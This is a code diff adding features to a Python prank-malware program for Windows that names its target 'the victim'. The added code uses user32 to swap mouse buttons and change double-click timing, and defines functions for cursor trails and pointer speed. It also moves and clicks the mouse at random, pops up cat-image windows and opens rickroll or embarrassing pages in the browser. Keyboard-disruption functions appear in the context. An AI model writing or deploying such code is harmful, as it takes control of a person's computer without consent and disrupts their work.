@@ -7,6 +7,9 @@
 
 import os
 
+import PIL.Image
+import PIL.ImageTk
+
 def is_admin() -> bool:
     try:
         # only windows users with admin privileges can read the C:\windows\temp
@@ -206,7 +209,7 @@ def right_click():
     """ Sends a right click with the given button. """
     click(RIGHT)
 
-def move(x, y, absolute=True, duration=0, steps_per_second=120.0):
+def move(x, y, absolute=True, duration=0.0, steps_per_second=120.0):
     x = int(x)
     y = int(y)
 
@@ -264,7 +267,7 @@ def mouse_malfunction() -> Callable:
     # Thanks to https://github.com/boppreh/mouse for the mouse functions 
     """Returns a random function that will create unexpected behaviour with the victim's mouse."""
     def move_mouse_randomly():  
-        move(random.randint(-100, 100), random.randint(-100, 100), absolute=False)
+        move(random.randint(-100, 100), random.randint(-100, 100), absolute=False, duration=0.5)
         time.sleep(random.uniform(0.5, 2))  # Random delay between movements
     
     def random_clicks():
@@ -275,7 +278,31 @@ def mouse_malfunction() -> Callable:
     def random_wheel_scroll():
         wheel(random.choice([-1, 1]) * random.randint(1, 3))
     
-    return random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll])
+    def double_click():
+        """Change doublie click threshold"""
+        # Basically only affects text selection :c
+        if random.random() < 0.5:
+            user32.SetDoubleClickTime(5000)
+        else:
+            user32.SetDoubleClickTime(1)
+        
+    def swap_mouse_buttons():
+        current_state = user32.GetSystemMetrics(23) # SM_SWAPBUTTON - 0 if default, not zero if swap
+        match current_state:
+            case 0:
+                user32.SwapMouseButton(True)  # Swap mouse buttons
+            case _:
+                user32.SwapMouseButton(False)  # Restore default mouse buttons
+
+    def cursor_trail():
+        user32.SystemParametersInfoW(0x005D, 10, None, 0) # Turn cursor trail on
+    
+
+    def sensitivity():
+        new_sense = random.randint(1, 20)  # Random sensitivity between 1 and 20
+        user32.SystemParametersInfoW(0x0071, 0, new_sense, 0)  # SPI_SETMOUSESPEED
+
+    return random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll, double_click, swap_mouse_buttons])
 
 
 def keyboard_malfunction() -> Callable:
@@ -301,20 +328,53 @@ def keyboard_malfunction() -> Callable:
         time.sleep(random.uniform(0.5, 2))
         user32.keybd_event(0x14, 0, 2, 0)
     
+    
     return random.choice([block_input, random_key_presses, broken_caps_lock])
 
 
 # Feature 2 - Random popup windows, no idea how to do this yet...
 def funny_windows():
     """Make funny popup windows"""
-    pass
+    import json
+    from urllib.request import urlopen, Request
+    import tkinter as tk
+    import PIL.ImageTk, PIL.ImageFile
+
+    url = 'https://cataas.com/cat?position=center&width=1000&height=1000&json=true'
+    req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+    response = json.loads(urlopen(req).read())
+
+    window = tk.Tk()
+    window.resizable(False, False)
+
+    image_content_url, mime_type= response['url'], response['mimetype'][6:]  # mimetype is like 'image/png'
+    image_data = urlopen(image_content_url).read()
+    parser = PIL.ImageFile.Parser()
+    parser.feed(image_data)
+    image = PIL.ImageTk.PhotoImage(parser.close(), format=mime_type)
+
+    canvas = tk.Canvas(window, width=image.width(), height=image.height())
+    canvas.pack()
+    canvas.create_image(0, 0, image=image, anchor='nw')
+    canvas.pack(padx=0, pady=0) # Make it fit
+
+    window.title("Meow :3")
+    window.update()
+    
 
 
 # Feature 3 - Random rickroll redirects, no idea how to do this yet...
 
 def redirects():
-    """Randomly redirects victim to be rickrolled"""
-    pass
+    """Randomly redirects victim to funny places"""
+    import webbrowser
+    sites = [
+        'https://www.youtube.com/watch?v=dQw4w9WgXcQ', # RIckroll
+        'https://shipping.fandom.com/wiki/My_Hero_Academia',
+        'https://www.google.com/search?q=Do%20I%20have%20Syphilis',
+        'https://www.youtube.com/watch?v=XqZsoesa55w' # Baby Shark
+    ]
+    webbrowser.open(random.choice(sites))
 
 
 # Example usage for now
